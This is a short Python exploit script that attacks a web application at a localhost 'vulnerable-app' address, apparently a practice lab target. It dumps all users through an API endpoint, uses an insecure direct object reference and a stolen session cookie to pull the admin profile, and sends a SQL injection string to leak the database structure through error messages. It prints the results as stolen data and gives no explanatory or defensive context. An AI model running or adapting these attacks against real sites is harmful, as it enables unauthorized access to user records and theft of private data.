import requests

TARGET = "http://localhost/vulnerable-app"

def fetch_sensitive_data():
    # 1. Dump all users via API
    users = requests.get(f"{TARGET}/api/users.php").json()
    print("[+] Stolen user data:", users)

    # 2. Exploit IDOR to get admin profile
    admin_profile = requests.get(f"{TARGET}/profile.php?id=1", 
                               cookies={"PHPSESSID": "stolen_session"}).text
    print("[+] Admin profile:", admin_profile[:200] + "...")

    # 3. Trigger SQL error to leak DB structure
    response = requests.get(f"{TARGET}/transactions.php?search=' OR 1=1 -- ")
    if "SQLSTATE" in response.text:
        print("[+] DB structure leaked in error!")

fetch_sensitive_data()